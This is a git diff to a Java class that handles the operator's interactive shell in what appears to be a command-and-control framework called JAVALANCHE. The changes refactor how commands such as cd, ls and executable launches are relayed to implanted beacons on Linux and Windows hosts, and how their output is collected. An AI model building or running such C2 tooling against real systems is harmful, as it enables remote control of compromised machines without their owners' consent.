@@ -1,6 +1,5 @@
 package Servers.C2;
 
-import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.HashMap;
@@ -259,20 +258,7 @@ public class C2ServerUserHandler implements Runnable{
                 }
             }
 
-            C2server.broadcastToBeacons("Command " + clientIP + "_pwd");
-            try{
-                Thread.sleep(2000);
-            } catch(InterruptedException e){
-                e.printStackTrace();
-            }
-
-            C2server.broadcastToBeacons("Request " + clientIP + "_ ");
-
-            try{
-                Thread.sleep(2000);
-            } catch(InterruptedException e){
-                e.printStackTrace();
-            }
+            C2server.getShellResponse("Shell " + clientIP + "_pwd");
 
             String currentDirectory = "C:\\";
             
@@ -324,98 +310,99 @@ public class C2ServerUserHandler implements Runnable{
                 // Get command from user
                 command = userInputScanner.nextLine();
 
-                if (!(command.isEmpty())){
-                    if(command.equals("q")){
-                        currentUserPath = "";
-                        break;
-                    } else if (command.substring(0,2).equals("cd")){
-                        // Change Current Directory
-                        // Linux
-                        if(currentDirectory.charAt(0) == '/'){
-                            dir = command.substring(3);
-                            if (dir.substring(0,1).equals("/")){
-                                currentDirectory = dir;
-                            } else if (dir.equals("..")) {
-                                dirs = currentDirectory.split("/");
-                                currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[dirs.length - 1]));
+                try {
+                    if (!(command.isEmpty())){
+                        if(command.equals("q")){
+                            currentUserPath = "";
+                            break;
+                        } else if (command.substring(0,2).equals("cd")){
+                            // Change Current Directory
+                            // Linux
+                            if(currentDirectory.charAt(0) == '/'){
+                                dir = command.substring(3);
+                                if (dir.substring(0,1).equals("/")){
+                                    currentDirectory = dir;
+                                } else if (dir.equals("..")) {
+                                    dirs = currentDirectory.split("/");
+                                    currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[dirs.length - 1]));
+                                } else {
+                                    currentDirectory += dir + "/";
+                                }
                             } else {
-                                currentDirectory += dir + "/";
+                                // Windows
+                                dir = command.substring(3);
+                                if (dir.contains("C:\\")){
+                                    currentDirectory = dir;
+                                } else if (dir.equals("..")) {
+                                    dirs = currentDirectory.split("\\\\");
+                                    currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[dirs.length - 1]) - 1);
+                                } else {
+                                    currentDirectory += "\\" + dir;
+                                }
                             }
-                        } else {
-                            // Windows
-                            dir = command.substring(3);
-                            if (dir.contains("C:\\")){
-                                currentDirectory = dir;
-                            } else if (dir.equals("..")) {
-                                dirs = currentDirectory.split("\\\\");
-                                currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[dirs.length - 1]) - 1);
+                            
+                            runCommand = false;
+                        } else if (command.equals("ls")){
+                            // List items of current directory
+                            if(currentDirectory.charAt(0) == '/'){
+                                // Linux
+                                command = "ls " + currentDirectory + "/";
                             } else {
-                                currentDirectory += "\\" + dir;
+                                // Windows
+                                command = "ls " + currentDirectory + "\\";
+                            }
+                        } else if (command.equals("ls -la")){
+                            // List items with extra details of current directory
+                            if(currentDirectory.charAt(0) == '/'){
+                                // Linux
+                                command = "ls -la " + currentDirectory + "/";
+                            } else {
+                                // Windows
+                                command = "ls -la " + currentDirectory + "\\";
+                            }
+                        } else if (command.substring(0,2).equals(".\\")){
+                            // if the first two characters are .\, then it is attempting to run an executable on windows, in the current directory.
+                            // Because we are not actually in the current directory, we will use &, followed by the full executable path
+                            command = "& " + currentDirectory + command.substring(2);
+                        } else if (command.substring(0,2).equals("./")){
+                            // If the first two characters are ./, then it is attempting to run an executable on linux in the current directory
+                            // Because we are not actually in the current directory, we will just use the full executable name
+                            command = currentDirectory + command.substring(2);
+                        } else if (command.equals("pwd")){
+                            System.out.println(currentDirectory);
+                            runCommand = false;
+                        }
+
+                        if(runCommand){
+                            // Send the Command
+                            C2server.getShellResponse("Shell " + clientIP + "_" + command);
+
+                            // Get all messages
+                            messages = messageQueue.toArray();
+                            messageQueue.removeAll(messageQueue);
+
+                            // Store all of the messages just received in a new temp list
+                            tempReadMessagesList = new ArrayList<>();
+                            for(Object message : messages){
+                                tempReadMessagesList.add(message.toString());
+                            }
+
+                            System.out.println();
+                            // Iterate through responses and print only ones that are new
+                            for(Object message : messages){
+                                if(!(readMessages.contains(message.toString()))){
+                                    System.out.println(message.toString().substring(message.toString().indexOf(".") + 1));
+                                }
+                            }
+
+                            // Replace the old already read messages list with the new one saved from earlier
+                            if(!(tempReadMessagesList.isEmpty())){
+                                readMessages = tempReadMessagesList;
                             }
                         }
-                        
-                        runCommand = false;
-                    } else if (command.equals("ls")){
-                        // List items of current directory
-                        command = "ls " + currentDirectory;
-                    } else if (command.equals("ls -la")){
-                        // List items with extra details of current directory
-                        command = "ls -la " + currentDirectory;
-                    } else if (command.substring(0,2).equals(".\\")){
-                        // if the first two characters are .\, then it is attempting to run an executable on windows, in the current directory.
-                        // Because we are not actually in the current directory, we will use &, followed by the full executable path
-                        command = "& " + currentDirectory + command.substring(2);
-                    } else if (command.substring(0,2).equals("./")){
-                        // If the first two characters are ./, then it is attempting to run an executable on linux in the current directory
-                        // Because we are not actually in the current directory, we will just use the full executable name
-                        command = currentDirectory + command.substring(2);
-                    } else if (command.equals("pwd")){
-                        System.out.println(currentDirectory);
-                        runCommand = false;
                     }
-
-                    if(runCommand){
-                        // Send the Command
-                        C2server.broadcastToBeacons("Command " + clientIP + "_" + command);
-
-                        // Give the client a moment to run the command and return tne responses
-                        try{
-                            Thread.sleep(2000);
-                        } catch(InterruptedException e){
-                            e.printStackTrace();
-                        }
-
-                        C2server.broadcastToBeacons("Request " + clientIP + "_ ");
-                        
-                        try{
-                            Thread.sleep(2000);
-                        } catch(InterruptedException e){
-                            e.printStackTrace();
-                        }
-
-                        // Get all messages
-                        messages = messageQueue.toArray();
-                        messageQueue.removeAll(messageQueue);
-
-                        // Store all of the messages just received in a new temp list
-                        tempReadMessagesList = new ArrayList<>();
-                        for(Object message : messages){
-                            tempReadMessagesList.add(message.toString());
-                        }
-
-                        System.out.println();
-                        // Iterate through responses and print only ones that are new
-                        for(Object message : messages){
-                            if(readMessages.contains(message.toString())){
-                                readMessages.remove(message.toString());
-                            } else {
-                                System.out.println(message.toString().substring(5));
-                            }
-                        }
-
-                        // Replace the old already read messages list with the new one saved from earlier
-                        readMessages = tempReadMessagesList;
-                    }
+                } catch (StringIndexOutOfBoundsException e){
+                    System.out.println("Invalid input: Please enter more than 1 character as a command");
                 }
             }
         }
@@ -743,11 +730,6 @@ public class C2ServerUserHandler implements Runnable{
                 currentUserPath = "";
             }
         }
-    }
-    public static void main(String[] args) throws IOException {
-        C2Server server = new C2Server();
-        C2ServerUserHandler CLI = new C2ServerUserHandler(server);
-        CLI.printJAVALANCHE();
     }
 }
 
